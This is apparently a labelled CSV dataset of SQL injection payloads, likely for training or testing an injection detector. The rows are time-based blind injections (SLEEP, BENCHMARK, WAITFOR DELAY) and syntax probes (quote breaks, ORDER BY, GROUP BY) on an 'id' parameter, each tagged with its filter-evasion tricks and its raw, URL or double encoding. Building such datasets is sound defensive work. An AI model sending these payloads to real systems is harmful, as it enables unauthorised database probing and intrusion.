id%253D1%2527%2BAND%2BWAITFOR%2BDELAY%2B%25270%253A0%253A1%2527%2B%2523,1,sqli_blind_time,comment_hash|ws_space,double_encoded,SQLI_BLIND_TIME_005,a7e54550e4c091b8de208ba0613ec870,9890e141fa7f43238800971a2b411420,71
id%3D1%27+AND+IF%28%282%3E1%29%2C+SLEEP%281%29%2C+0%29+%2523,1,sqli_blind_time,comment_url_hash,url_encoded,SQLI_BLIND_TIME_003,35951be6ec6ad3d87210de997496bcc0,0be44f0d5b1743c4e27f3642e76fed2a,60
id%3D1%27%2BAND%2BBENCHMARK%285000000%2C%2BMD5%281%29%29%2B%3B--%2B-,1,sqli_blind_time,comment_semicolon_comment|ws_plus,url_encoded,SQLI_BLIND_TIME_002,95624f38a77860f78047ec009666dacc,41536d4ea563c555d03d78fe4dde71f3,68
id%3D1%27+and+WAITFOR+DELAY+%270%3A0%3A2%27+%3B--+-,1,sqli_blind_time,case_var|comment_semicolon_comment,url_encoded,SQLI_BLIND_TIME_005,10ee555a6964435143b89a4dadd2ed3b,324f381caebeb4613434ad202123e25a,51
id%3D1%27%2BAND%2BBENCHMARK%285000000%2C%2BMD5%281%29%29%2B%23,1,sqli_blind_time,comment_hash|ws_plus,url_encoded,SQLI_BLIND_TIME_002,9236becac1b3df05547411ccfc9f1d7a,e5b3ae265901cae663337e3b575ca05e,62
id%3D1%27+AND+WAITFOR+DELAY+%270:0:1%27+%23,1,sqli_blind_time,comment_url_hash,partially_encoded,SQLI_BLIND_TIME_005,f6f4f55e7a9398b8f4d1ec7651ea3206,75334663e4697b831c0bed40dda6b454,43
"id=1' and BENCHMARK(5000000, MD5(1)) -- -",1,sqli_blind_time,case_var|comment_dash_dash_space,raw,SQLI_BLIND_TIME_002,53bdf84159eec53b2cc06f29f78b4b52,30ca990e6a2288dc9e26d7e01d8b6ce5,41
id%3D1%27%2F%2A%2A%2FAND%2F%2A%2A%2FBENCHMARK%285000000%2C%2F%2A%2A%2FMD5%281%29%29%2F%2A%2A%2F--%2F%2A%2A%2F-,1,sqli_blind_time,comment_dash_dash_space|ws_mixed_ws,url_encoded,SQLI_BLIND_TIME_002,d9e5dce5902a32953da85b437e269256,4ad90e0246e19896d88092f5bc3e411f,110
"id=1'/**/aNd/**/BENCHMARK(5000000,/**/MD5(1))/**//*",1,sqli_blind_time,case_var|comment_block_comment|ws_comment_ws,raw,SQLI_BLIND_TIME_002,72d8e5fb11320cf5b4ba03515ef98273,c9032f66976f2fffec0736789aee840b,51
"id=1' AND IF((2>1), SLEEP(10), 0) -- -",1,sqli_blind_time,case_var|comment_dash_dash_space|ws_space,raw,SQLI_BLIND_TIME_003,2e1e017dbf1daa4af4431f006fcafa8e,a73d048e0b1559c6d6ca464f345104d0,38
id%253D1%2527%252BaND%252BIF%2528%2528ASCII%2528%2527A%2527%2529%253D65%2529%252C%252BSLEEP%25281%2529%252C%252B0%2529%252B--,1,sqli_blind_time,case_var|comment_dash_dash|ws_plus,double_encoded,SQLI_BLIND_TIME_003,a6bb467ec359df78e4c552ad38d9b78f,89bba5b6eee672f8896c8b4c9b5e60b4,125
"id=1'	AND	IF((1=1),	SLEEP(5),	0)	;--	-",1,sqli_blind_time,case_var|comment_semicolon_comment|ws_tab,raw,SQLI_BLIND_TIME_003,accb89f9665d02223bdad891d3595212,01ef5e7280fb72c087e9463dea1de897,38
id%253D1%2527%2509AND%2509WAITFOR%2509DELAY%2509%25270%253A0%253A1%2527%2509%252523,1,sqli_blind_time,comment_url_hash|ws_tab,double_encoded,SQLI_BLIND_TIME_005,a21a27fd8993180130d97b8c077d6698,62bd94881a03d4abc80e248bfe5b433d,83
"id=1'  AND  BENCHMARK(5000000,  MD5(1))  /*",1,sqli_blind_time,comment_block_comment|ws_multi_space,raw,SQLI_BLIND_TIME_002,5ddb152d8ee506de76d8dce59297468b,5e628e14d0de88a51ac54905d5e545f2,43
id=1%27+AND+SLEEP(5)+%23,1,sqli_blind_time,comment_hash|ws_space,partially_encoded,SQLI_BLIND_TIME_001,57ea1b1d71545e684f568574e5c90fe6,4ed860f2fe11f246dbb5fd42c64aec67,24
"id%3D1' AND BENCHMARK(5000000,+MD5(1))+--",1,sqli_blind_time,case_var|comment_dash_dash,partially_encoded,SQLI_BLIND_TIME_002,ef3ca28195ce3c421930fb67a4a22ada,da89c42d300fcd1186f9ba7d2ffc7ed7,41
id%3D1%27+AND+SLEEP(1)+;--+-,1,sqli_blind_time,case_var|comment_semicolon_comment,partially_encoded,SQLI_BLIND_TIME_001,10f36c65547d093a12a3a853ba95d4c8,58ac54178782bfffcc22e51551175771,28
id%253D1%2527%2BaNd%2BIF%2528%2528LENGTH%2528%2527test%2527%2529%253D4%2529%252C%2BSLEEP%252810%2529%252C%2B0%2529%2B%253B--%2B-,1,sqli_blind_time,case_var|comment_semicolon_comment,double_encoded,SQLI_BLIND_TIME_003,c10ec1cae064e4a5b65d9e0cac7ee407,b3daf619616b0e879862ed9c262c2279,128
id%253D1%2527%2BAND%2BWAITFOR%2BDELAY%2B%25270%253A0%253A1%2527%2B%252F%252A,1,sqli_blind_time,case_var|comment_block_comment,double_encoded,SQLI_BLIND_TIME_005,75928eeb708b4245c6856b3c771dc1bb,b1e3f71d8833831262ea56b1b1c146f2,76
id=1' AND SLEEP(2) -- -,1,sqli_blind_time,case_var|comment_dash_dash_space,raw,SQLI_BLIND_TIME_001,381e849d121a0dbdbfbad2ba45089ab3,eddfe26719c7fa908c8f150543ce3f60,23
id=1' And (SELECT * from (SELECT(SLEEP(1)))a) -- -,1,sqli_blind_time,case_var|comment_dash_dash_space|ws_space,raw,SQLI_BLIND_TIME_004,92a9e8e62fd0b1fa8638c09897b8f102,aa5e3b7182cbf0f8adc908754be8d2d1,50
"id=1'	AND	IF((2>1),	SLEEP(5),	0)	#",1,sqli_blind_time,comment_hash|ws_tab,raw,SQLI_BLIND_TIME_003,98cbdcda8442ae289ef9625250bf207c,77fd6503c37c48fc7dc79d85c8f49bfb,34
"id=1'+AND+BENCHMARK(5000000,+MD5(1))+#",1,sqli_blind_time,comment_hash|ws_plus,raw,SQLI_BLIND_TIME_002,f5f8d338cc27729d33090b13aa90a9a6,26ff84fa52ec61f5a0eef45dfe35e83a,38
id%253D1%2527%2BAND%2BIF%2528%25287%253D7%2529%252C%2BSLEEP%25282%2529%252C%2B0%2529%2B%253B--%2B-,1,sqli_blind_time,case_var|comment_semicolon_comment,double_encoded,SQLI_BLIND_TIME_003,57de75a966fb9e157353ae5194f925cd,037d4a0a746cd0c584bba2c776e19676,98
id%3D1%27+AND+IF%28%28ASCII%28%27A%27%29%3D65%29%2C+SLEEP%282%29%2C+0%29+--,1,sqli_blind_time,comment_dash_dash|ws_space,url_encoded,SQLI_BLIND_TIME_003,81aeab4135cef1aad270fb07139e323d,07c780549e6a12789f4324956c105d9d,75
"id%3D1'%2F%2A*%2FAND%2F*%2A%2FBENCHMARK(5000000,/%2A%2A/MD5(1))%2F%2A*/%23",1,sqli_blind_time,comment_url_hash|ws_comment_ws,partially_encoded,SQLI_BLIND_TIME_002,5e02f39d9186fb7c75799feae5e0e153,7c438076f9de9d6ea59467cf65fa503c,74
id%3D1%27++AND++IF%28%28CHAR%2897%29%3D%27a%27%29%2C++SLEEP%285%29%2C++0%29++--,1,sqli_blind_time,comment_dash_dash|ws_multi_space,url_encoded,SQLI_BLIND_TIME_003,9cc6359a64cdb80862e8eddabaa9f137,de7e22c23f80dc09f5ded646d7ac94a2,79
id%3D1'+And+(SELECT+%2A+from+(SELECT(SLEEP(10)))a) %2F*,1,sqli_blind_time,case_var|comment_block_comment,partially_encoded,SQLI_BLIND_TIME_004,ad9d3ac01a7d98573eac775ac3e73b18,d81c4523290e473056485a9c378ed963,55
id%3D1%27%2F%2A%2A%2FAnd/%2A*%2F(SELECT%2F*%2A%2F%2A%2F%2A%2A/FROM/%2A*%2F(SELECT(SLEEP(5)))a)/*%2A%2F/%2A,1,sqli_blind_time,case_var|comment_block_comment|ws_comment_ws,partially_encoded,SQLI_BLIND_TIME_004,5074c9b2583d8983d21cf226d8670532,553f7990ef09e6bc44e061ec541e2d2a,106
"id=1' AND IF((2>1), SLEEP(1), 0) /*",1,sqli_blind_time,comment_block_comment|ws_space,raw,SQLI_BLIND_TIME_003,f5293aeff5cf669c4e8b84ce0e827493,bece9c1c8692bfa1eb7342101dee018f,35
id%253D1%2527%2B%2BAND%2B%2BSLEEP%252810%2529%2B%2B%252F%252A,1,sqli_blind_time,comment_block_comment|ws_multi_space,double_encoded,SQLI_BLIND_TIME_001,2a60617a6792673d2ae3a39244d547b9,fb67c8ccb3113b4e64d46a68439b0364,61
id%253D1%2527%2509AnD%2509%2528SELECT%2509%252A%2509From%2509%2528SELECT%2528SLEEP%25285%2529%2529%2529a%2529%2509%252F%252A,1,sqli_blind_time,case_var|comment_block_comment|ws_tab,double_encoded,SQLI_BLIND_TIME_004,a1701604c5288ee7431aca29e86aead3,266ac22aeca5292ac0fe973850c49c87,124
id%253D1%2527%2509and%2509BENCHMARK%25285000000%252C%2509MD5%25281%2529%2529%2509--,1,sqli_blind_time,case_var|comment_dash_dash|ws_tab,double_encoded,SQLI_BLIND_TIME_002,1f0360de20e5dc57e9b23b1cb111a304,869608526251c758323c7ad3b97de4de,83
"id%3D1%27 and BENCHMARK(5000000,+MD5(1)) %23",1,sqli_blind_time,case_var|comment_url_hash,partially_encoded,SQLI_BLIND_TIME_002,3203a002bc0a6d4e79750f1d509bd370,aeb9cd02181aee33dfdb353e0f0635fc,44
id%253D1%2527%252F%252A%252A%252FAND%252F%252A%252A%252F%2528SELECT%252F%252A%252A%252F%252A%252F%252A%252A%252FFROM%252F%252A%252A%252F%2528SELECT%2528SLEEP%25285%2529%2529%2529a%2529%252F%252A%252A%252F--,1,sqli_blind_time,comment_dash_dash|ws_comment_ws,double_encoded,SQLI_BLIND_TIME_004,dba2b6bf0ee7fe7c415708c7ab212933,a0e2203e1fcfc76f965f9cb2c61f5d94,206
id=1' And (SELECT * from (SELECT(SLEEP(1)))a) --,1,sqli_blind_time,case_var|comment_dash_dash|ws_space,raw,SQLI_BLIND_TIME_004,a2ace99c820be5212ea35570237579a0,bf9d55407668b47c6a271373fbd279b2,48
id%3D1%27+++and+++SLEEP%282%29+++%23,1,sqli_blind_time,case_var|comment_hash|ws_mixed_ws,url_encoded,SQLI_BLIND_TIME_001,832f60f3307eee28eb476925f9a2cfc4,ceac48a5e09500db2f6c943a02af5542,36
"id=1' And BENCHMARK(5000000, MD5(1)) %23",1,sqli_blind_time,case_var|comment_url_hash|ws_space,raw,SQLI_BLIND_TIME_002,dbe02ed71da4f761ac5e0179c2f7f7fb,65174debe6877e033d743a1b47b0060e,40
id%3D1%27+and+WAITFOR+DELAY+%270%3A0%3A1%27+--+-,1,sqli_blind_time,case_var|comment_dash_dash_space|ws_space,url_encoded,SQLI_BLIND_TIME_005,e725573a10f100654f9557bbc4f30c31,e8f5964f42d81230f79a9344647ce664,48
id%3D1%27  And +SLEEP(2)++--  -,1,sqli_blind_time,case_var|comment_dash_dash_space|ws_multi_space,partially_encoded,SQLI_BLIND_TIME_001,f6086e72002015bff045d077a9894a73,e2d3a7f990ca4891c311f87e37f12299,31
id=1'+And+SLEEP(10)+;--+-,1,sqli_blind_time,case_var|comment_semicolon_comment|ws_mixed_ws,raw,SQLI_BLIND_TIME_001,1ebe048fa286d8ecfee82db6c569a49d,f865272e1831a7750907f179bd0278c5,25
id%3D1%27+and+WAITFOR+DELAY+%270%3A0%3A10%27+%23,1,sqli_blind_time,case_var|comment_hash,url_encoded,SQLI_BLIND_TIME_005,3b6eab2f6bd11bb420a97486d9a979ca,c4e65b8a617d20a5f10153593c2c68e7,48
id%253D1%2527%2BAND%2BIF%2528%2528ASCII%2528%2527A%2527%2529%253D65%2529%252C%2BSLEEP%25282%2529%252C%2B0%2529%2B%253B--%2B-,1,sqli_blind_time,comment_semicolon_comment|ws_space,double_encoded,SQLI_BLIND_TIME_003,6cd982caed43e842835ea561676a8def,a937cbc44015669d68747d8ca4c16c34,124
"id%3D1%27	And	BENCHMARK(5000000,	MD5(1))	%2F%2A",1,sqli_blind_time,case_var|comment_block_comment|ws_tab,partially_encoded,SQLI_BLIND_TIME_002,f800ba09103031ccd43f6c8f1401c197,a4bb268269eb9fbddfc256c3f0056401,47
id%253D1%2527%2BAnd%2BIF%2528%2528ASCII%2528%2527A%2527%2529%253D65%2529%252C%2BSLEEP%25285%2529%252C%2B0%2529%2B%252523,1,sqli_blind_time,case_var|comment_url_hash,double_encoded,SQLI_BLIND_TIME_003,54887ea458b191114137b6eeaa476c23,e7d0feb955d7951c920399d3613ecb9b,120
id%3D1%27%2F%2A%2A%2FAND%2F%2A%2A%2FSLEEP%281%29%2F%2A%2A%2F%23,1,sqli_blind_time,case_var|comment_hash|ws_comment_ws,url_encoded,SQLI_BLIND_TIME_001,dabd23ee0fde20c5ae7a9e228500069f,55b6100af5ac3e229393810d1267c409,63
id%3D1%27%2F%2A%2A%2FAnd%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F%2A%2F%2A%2A%2Ffrom%2F%2A%2A%2F%28SELECT%28SLEEP%285%29%29%29a%29%2F%2A%2A%2F%2F%2A,1,sqli_blind_time,case_var|comment_block_comment|ws_comment_ws,url_encoded,SQLI_BLIND_TIME_004,5cfeb96fd2d29c7be5f030490535b8e6,4d51a1d56ffc0698b8a02dcb7d1e6d4a,140
id=1' AND SLEEP(10) /*,1,sqli_blind_time,case_var|comment_block_comment|ws_space,raw,SQLI_BLIND_TIME_001,2476e30c17a6bd0866502f6d73210a85,9cc2ce5a0c9d7822c979a2a549358bd2,22
"id=1' AND IF((1=1), SLEEP(1), 0) #",1,sqli_blind_time,case_var|comment_hash|ws_space,raw,SQLI_BLIND_TIME_003,b379ba8d6ec85f0d3d64ed4df0a8ca0e,1213611376fa3939f44170787da91dcf,34
id%3D1%27%2520And%2520WAITFOR%2520DELAY%2520%270%3A0%3A10%27%2520%2F%2A,1,sqli_blind_time,case_var|comment_block_comment|ws_url_space,url_encoded,SQLI_BLIND_TIME_005,b1af7e268f639e5e6927437c2e6b4875,3305346a9b22160a0684809b90d91a23,71
id=1' And (SELECT * FROM (SELECT(SLEEP(1)))a) ;-- -,1,sqli_blind_time,case_var|comment_semicolon_comment,raw,SQLI_BLIND_TIME_004,26c7826f18a79fc4d9342132a9615c63,d58528709efeec0574e31de37a7c4551,51
"id=1' and IF((LENGTH('test')=4), SLEEP(5), 0) -- -",1,sqli_blind_time,case_var|comment_dash_dash_space,raw,SQLI_BLIND_TIME_003,3a46ce47c0b5531508b1c960c09d066e,54c668934dfc4e2d303bbf3d0e586deb,50
id=1%27+and+WAITFOR+DELAY %270:0:2' --,1,sqli_blind_time,case_var|comment_dash_dash,partially_encoded,SQLI_BLIND_TIME_005,1d1cd8a78af792fb48047a4ac4743322,8360596f4b8cf453aa7390e985b76ebf,38
"id%3D1'+AND+BENCHMARK(5000000,+MD5(1))+#",1,sqli_blind_time,comment_hash,partially_encoded,SQLI_BLIND_TIME_002,14ab07cb28d769b76f45c7006a8ef053,f4403b00d23fed7169223ce040df7820,40
id=1'%20And%20WAITFOR%20DELAY%20'0:0:2'%20%23,1,sqli_blind_time,case_var|comment_url_hash|ws_url_space,raw,SQLI_BLIND_TIME_005,ac00e531edeecf951ead61d46645bb49,191a5505c8083804c0d4b8c43494b3bf,45
id=1 ORDER BY 1/*,1,sqli_syntax_probe,case_var|comment_block_comment,raw,SQLI_SYNTAX_PROBE_010,a777d9cb0e04aa98265662a01fb51c53,bba08fcf8e83374648c3fbe475a0e151,17
id%253D1%2522%2529,1,sqli_syntax_probe,case_var|ws_multi_space,double_encoded,SQLI_SYNTAX_PROBE_006,a116323f2b791754c84f8508fc95b8de,d97e8d999b49cdf0bf0db2d498ec30ff,18
"id=1"");--/**/-",1,sqli_syntax_probe,comment_semicolon_comment|ws_comment_ws,raw,SQLI_SYNTAX_PROBE_006,8e0304618f7c9bebb4294e0b931c4391,8e0304618f7c9bebb4294e0b931c4391,14
id=1/*%2A%2FORDER/%2A%2A%2FBY%2F*%2A/100%23,1,sqli_syntax_probe,case_var|comment_hash|ws_mixed_ws,partially_encoded,SQLI_SYNTAX_PROBE_011,7a4d2a06c76e55c02124b833694275b6,225a3da754a60904b3b7dfc26a97f534,43
id%253D1%2527%2529%253B--%2B-,1,sqli_syntax_probe,comment_semicolon_comment|ws_space,double_encoded,SQLI_SYNTAX_PROBE_005,6ad129128e2fe146f39c072bd98a6701,ff74e345a177e288fe60bf344e75c15f,29
id%3D1%22),1,sqli_syntax_probe,ws_url_space,partially_encoded,SQLI_SYNTAX_PROBE_006,55db098e6a819d2493c9c4f169f50446,cfbae0dab1d13e23a950e73460e47e73,10
"id%3D1\""/%2A",1,sqli_syntax_probe,case_var|comment_block_comment|ws_comment_ws,partially_encoded,SQLI_SYNTAX_PROBE_004,2d8afdab807afe93a29e726e55e755d5,97d9c603f28af963b66150ba7f3876ba,12
id=1',1,sqli_syntax_probe,case_var,raw,SQLI_SYNTAX_PROBE_001,5e591ee5ce42556bda87262088f4dc38,5e591ee5ce42556bda87262088f4dc38,5
id%3D1%27%29--,1,sqli_syntax_probe,case_var|comment_dash_dash|ws_tab,url_encoded,SQLI_SYNTAX_PROBE_005,04dc82306a5defaf467e71014543b278,34ba3e2a6afcc942571df6309edd970a,14
id%3D1+ORDER+BY+1#,1,sqli_syntax_probe,case_var|comment_hash,partially_encoded,SQLI_SYNTAX_PROBE_010,6640165360bcb56a6351c4ea4ed10a9a,22f98daec8c543576c6a81f06552cb88,18
id%253D1%2522%2529--,1,sqli_syntax_probe,case_var|comment_dash_dash|ws_url_space,double_encoded,SQLI_SYNTAX_PROBE_006,6038b4a230c842f4bf5643c51a8d2052,871ec23f622d73e70c9ef82349de2397,20
id=1 ORDER BY 1,1,sqli_syntax_probe,standard,raw,SQLI_SYNTAX_PROBE_010,3f88e2b7e10eda5e6b3e53ab78974934,624a7945d8cfd8d896e72f809b3a950c,15
id%3D1%2520ORDER%2520BY%2520100,1,sqli_syntax_probe,ws_url_space,url_encoded,SQLI_SYNTAX_PROBE_011,9d7966e813b797ac3e4b4bd3610087c0,83350ed1f976e406ffe4eb4cee88c831,31
id%3D1%27%3B--+-,1,sqli_syntax_probe,comment_semicolon_comment,url_encoded,SQLI_SYNTAX_PROBE_001,0c8640b5467644759444c35e5d88daf9,b75bb850155dbd9981693d3f13ea94d4,16
id=1 ORDER BY 100,1,sqli_syntax_probe,standard,partially_encoded,SQLI_SYNTAX_PROBE_011,b7bc626563c9df54302d5ce16a99f5b3,f499869105ef1a2bb33fda23eaf12b48,17
id%3D1%22,1,sqli_syntax_probe,ws_url_space,url_encoded,SQLI_SYNTAX_PROBE_002,1b9070ff823ef4724f9751da1d2c80c7,8b58e866f926c942b2485b1e3cbb8f38,9
id=1%27)%2F%2A,1,sqli_syntax_probe,comment_block_comment|ws_mixed_ws,partially_encoded,SQLI_SYNTAX_PROBE_005,2ef82efcdf3c7a7a0cfe7d511e0c4b67,5948eb0845c3681f6bfc66936ae9eca3,14
id%3D1',1,sqli_syntax_probe,ws_multi_space,partially_encoded,SQLI_SYNTAX_PROBE_001,7391a28b3ddbf6663768fa5ee57a30dc,f46a9d7100c3004b8f97a601332cc799,7
id=1%23,1,sqli_syntax_probe,case_var|ws_mixed_ws,partially_encoded,SQLI_SYNTAX_PROBE_009,5be22e2e3f89a7f86d746f390364564c,5be22e2e3f89a7f86d746f390364564c,7
id%253D1%2527%2529%2523,1,sqli_syntax_probe,case_var|comment_hash|ws_multi_space,double_encoded,SQLI_SYNTAX_PROBE_005,3ade19d56eb6e64888e270eb0ad24f39,10c0de4f314115048d55f446aaf9656f,23
id%3D1%5C%22--%2520-,1,sqli_syntax_probe,comment_dash_dash_space|ws_url_space,url_encoded,SQLI_SYNTAX_PROBE_004,a11bfdb80200b699c2bd6c2c38957606,b6f43a6b78edbb15eca81d709ae25311,20
id%3D1%5C%22,1,sqli_syntax_probe,case_var|ws_multi_space,url_encoded,SQLI_SYNTAX_PROBE_004,8476e4c65abfcf5e37651c6aea143323,2c3efd02ff3bfd992c90281e6da4b91e,12
id%253D1%2BGROUP%2BBY%2B1,1,sqli_syntax_probe,case_var,double_encoded,SQLI_SYNTAX_PROBE_012,18935da7847feede812c71032d374960,452c712a0c83871ad24a4232ef1c7577,25
id%253D1%2523%253B--%252F%252A%252A%252F-,1,sqli_syntax_probe,case_var|comment_semicolon_comment|ws_comment_ws,double_encoded,SQLI_SYNTAX_PROBE_009,a3cf4581b27853044b6cccec764fd43c,6586242c45ba20dffce7a886d1e8d54f,41
id=1%27--%2F%2A*%2F-,1,sqli_syntax_probe,case_var|comment_dash_dash_space|ws_comment_ws,partially_encoded,SQLI_SYNTAX_PROBE_001,7136063cd481ec8b1e18bfe331cd00e4,2d0f2ce520686352b87903ea903b4269,20
id=1';,1,sqli_syntax_probe,case_var,raw,SQLI_SYNTAX_PROBE_007,409d222aaad3aa71148e287dacf1bc33,409d222aaad3aa71148e287dacf1bc33,6
id%253D1%2B%2BGROUP%2B%2BBY%2B%2B1,1,sqli_syntax_probe,case_var|ws_multi_space,double_encoded,SQLI_SYNTAX_PROBE_012,16cb28bdd13238966b8fd78a79aec0bf,239ffbbb98060e602783b48e685bf75b,34
id=1';%23,1,sqli_syntax_probe,case_var|comment_url_hash,raw,SQLI_SYNTAX_PROBE_007,bef85ccd7497d529a88796377e9e69b7,bef85ccd7497d529a88796377e9e69b7,9
id=1'/*,1,sqli_syntax_probe,case_var|comment_block_comment|ws_plus,raw,SQLI_SYNTAX_PROBE_001,0c912d2cd49c80d344e5457e53e27277,0c912d2cd49c80d344e5457e53e27277,7
id%3D1%5C%27,1,sqli_syntax_probe,case_var,url_encoded,SQLI_SYNTAX_PROBE_003,ee2d88099f0e038adbc3f22449c814f5,1527b8f6d6fa1607fad8115815f5d8f7,12
id%253D1%2527%2529%252523,1,sqli_syntax_probe,comment_url_hash|ws_space,double_encoded,SQLI_SYNTAX_PROBE_005,58bdde494e14bd1ffcfa51411e32f1df,5451e6b8170d96d3026c385bfe75cfde,25
id%253D1%2522%2529%252523,1,sqli_syntax_probe,case_var|comment_url_hash,double_encoded,SQLI_SYNTAX_PROBE_006,158623c058d2a79f4ef3931b60f52027,78e35879ec39c27554eed23aa795e8ca,25
id%3D1--,1,sqli_syntax_probe,case_var|ws_tab,url_encoded,SQLI_SYNTAX_PROBE_008,207cdcb736b18a633b5d3dc2c3b2e280,2774c6db681a06cb3de5659c0c684e51,8
id%253D1%2522,1,sqli_syntax_probe,case_var|ws_tab,double_encoded,SQLI_SYNTAX_PROBE_002,2f53992b050a8735082f050bb87f3816,ff6d3a6d72b7599806b874c54c29aa69,13
id%253D1%2BORDER%2BBY%2B1%253B--%2B-,1,sqli_syntax_probe,case_var|comment_semicolon_comment|ws_space,double_encoded,SQLI_SYNTAX_PROBE_010,7e65e812f31ef4b40e0587bd4b437a21,eb4a638b3c30abe52d095968e7c2adeb,36
id=1/**/ORDER/**/BY/**/1#,1,sqli_syntax_probe,case_var|comment_hash|ws_comment_ws,raw,SQLI_SYNTAX_PROBE_010,5f8259c1284dabd2a2c210af4895558d,e7ead097b14e3392a6dabdeeab67d28d,25
id=1#,1,sqli_syntax_probe,case_var|ws_multi_space,raw,SQLI_SYNTAX_PROBE_009,47ee380032a3a1be679d23268c258237,47ee380032a3a1be679d23268c258237,5
id=1--,1,sqli_syntax_probe,ws_multi_space,raw,SQLI_SYNTAX_PROBE_008,cd5cf6aed08bc2cbe41b988653c14545,cd5cf6aed08bc2cbe41b988653c14545,6
id%253D1%252520ORDER%252520BY%252520100%253B--%252520-,1,sqli_syntax_probe,case_var|comment_semicolon_comment|ws_url_space,double_encoded,SQLI_SYNTAX_PROBE_011,46dc01f5c383f884359b28f8905836cd,131d08b30d95c3a0e36047c06faf4808,54
id%3D1\%27%3B--%20-,1,sqli_syntax_probe,case_var|comment_semicolon_comment|ws_url_space,partially_encoded,SQLI_SYNTAX_PROBE_003,b19ccc5c047468887e2e0238658a8b91,5fe9000db0b3e2dc818219dd03fb58d8,19
"id=1""/*",1,sqli_syntax_probe,case_var|comment_block_comment|ws_tab,raw,SQLI_SYNTAX_PROBE_002,97a92b177da1fef4bea14f71d441434b,97a92b177da1fef4bea14f71d441434b,7
id%253D1%255C%2527,1,sqli_syntax_probe,case_var|ws_tab,double_encoded,SQLI_SYNTAX_PROBE_003,690a9bcc68fd460ed266dc6ff5566dd7,94dcb7713708784506f86b635623b4e2,18
id%253D1%2522%2529--%252B-,1,sqli_syntax_probe,case_var|comment_dash_dash_space|ws_mixed_ws,double_encoded,SQLI_SYNTAX_PROBE_006,e11678bf17d3af74ad8fcaf7541a92c2,03b66625b582ee708a6488ac8d1fb241,26
id%253D1%255C%2522,1,sqli_syntax_probe,case_var|ws_plus,double_encoded,SQLI_SYNTAX_PROBE_004,5f26104f8087c1aa0dd3dfe78bdb5a4d,6fd0c9144a1faa595abaf41d0408616f,18
id%3D1%27,1,sqli_syntax_probe,case_var|ws_multi_space,url_encoded,SQLI_SYNTAX_PROBE_001,927aea347ccb49b6e21f3dcc1736fd90,e317a1db3d85cb0df5529a1b2f7049dc,9
id=1/**/ORDER/**/BY/**/1--,1,sqli_syntax_probe,case_var|comment_dash_dash|ws_comment_ws,raw,SQLI_SYNTAX_PROBE_010,4f32b84f3a00fef38283e3122c40343f,7f9ac38fec1307132e2152d2f17724b2,26
"id%3D1"")--+-",1,sqli_syntax_probe,comment_dash_dash_space,partially_encoded,SQLI_SYNTAX_PROBE_006,8c6dbbaf53caa9063156342d247d6da1,feb50f4729fc8189b872758415b8dc9c,12
id%253D1%2527--%252520-,1,sqli_syntax_probe,comment_dash_dash_space|ws_mixed_ws,double_encoded,SQLI_SYNTAX_PROBE_001,96efc9cbcde7cf7469cf260b4d7ec93e,9436bb9b31ab0f867333edf134787b73,23
id%3D1\%27,1,sqli_syntax_probe,ws_space,partially_encoded,SQLI_SYNTAX_PROBE_003,6f485c81a8e62c15c2b3054d9efd3370,faafbc5186f23bf8f177feceb27f5682,10
id%3D1%22%29,1,sqli_syntax_probe,case_var,url_encoded,SQLI_SYNTAX_PROBE_006,4a23d7ca43eaf350dc1b6b4c99c3b910,aa40d03e509448742c5a032079eaab00,12
id%3D1%27%3B,1,sqli_syntax_probe,case_var|ws_multi_space,partially_encoded,SQLI_SYNTAX_PROBE_007,e00eb5d9ce5300574cbdc03007f460d0,1f29a5c562c2bc57332b30948f74a436,12
id%3D1+ORDER+BY+100--,1,sqli_syntax_probe,comment_dash_dash,url_encoded,SQLI_SYNTAX_PROBE_011,685b708fb7a837b321c407d2ccf8fd89,335c7212e34848efc70444fc14815a81,21
id%253D1%2527,1,sqli_syntax_probe,standard,double_encoded,SQLI_SYNTAX_PROBE_001,9342f87675b47190e3b0ffa6fc5aab46,981109c87e3735ba9241020ace608e98,13
id%3D1%27--+-,1,sqli_syntax_probe,comment_dash_dash_space,url_encoded,SQLI_SYNTAX_PROBE_001,bf6ca3a107e5aa654a233e242d2de615,cea9cc6dda396c50011d69c46818bdce,13
id%3D1+GROUP+BY+1,1,sqli_syntax_probe,case_var,url_encoded,SQLI_SYNTAX_PROBE_012,7986092c7ffbb4bf5738a7f4d3bf1670,c1a92417179e1ada6c53c19044a11a83,17
id%3D1%22%23,1,sqli_syntax_probe,case_var|comment_hash|ws_multi_space,url_encoded,SQLI_SYNTAX_PROBE_002,6beb7dfb1283ced6da82c837424df35e,5e8b274bf103a2b642f4acbc5e5fee2d,12
id%253D1%2523--,1,sqli_syntax_probe,comment_dash_dash,double_encoded,SQLI_SYNTAX_PROBE_009,81f1bd3e000dbeb1e97e244f2a63f740,4e3618b2ae7dc57aa9f182287b5032a4,15
id=1'-- -,1,sqli_syntax_probe,case_var|comment_dash_dash_space,raw,SQLI_SYNTAX_PROBE_001,046782e0fa23a81d7a21accf0f2d3628,e8754f8f4fedcf1ec471beb8f47a37e0,9
id%3D1 ORDER+BY+100,1,sqli_syntax_probe,standard,partially_encoded,SQLI_SYNTAX_PROBE_011,44fe6d65fc8000483f62f87020202cbe,98e9e596abc049936d9dbea9e8e7f8df,19
id%3D1%22--,1,sqli_syntax_probe,comment_dash_dash,partially_encoded,SQLI_SYNTAX_PROBE_002,a6b7ce88bef4dc50e21b566ff9227bbe,9dc4e29f711fe23b2fa6dca4c44a7d91,11
id%253D1%252F%252A%252A%252FGROUP%252F%252A%252A%252FBY%252F%252A%252A%252F1%252F%252A,1,sqli_syntax_probe,case_var|comment_block_comment|ws_comment_ws,double_encoded,SQLI_SYNTAX_PROBE_012,e4dd28737adccf2bc24c650bb3ca82cf,51c6be1f810dc9a77b906dbdae705657,86
"id=1""",1,sqli_syntax_probe,case_var,raw,SQLI_SYNTAX_PROBE_002,a04760e0881d67808534aa169d6d2d7d,a04760e0881d67808534aa169d6d2d7d,5
id%253D1%252BORDER%252BBY%252B1,1,sqli_syntax_probe,ws_plus,double_encoded,SQLI_SYNTAX_PROBE_010,df379a016e39975724d6cc60f8183738,bfbaaef5032928ef5636b36060aa5aa0,31
id%3D1%27%3B%23,1,sqli_syntax_probe,case_var|comment_hash|ws_tab,url_encoded,SQLI_SYNTAX_PROBE_007,11ba99833d6deaec90249111a02a4768,fd4484d636e8cbd438228b991b80c62c,15
id=1 GROUP BY 1#,1,sqli_syntax_probe,comment_hash,raw,SQLI_SYNTAX_PROBE_012,fd25a3a5229c42e14f81adebd689ea34,457d6db7888ef8aa608bfb90d282b686,16
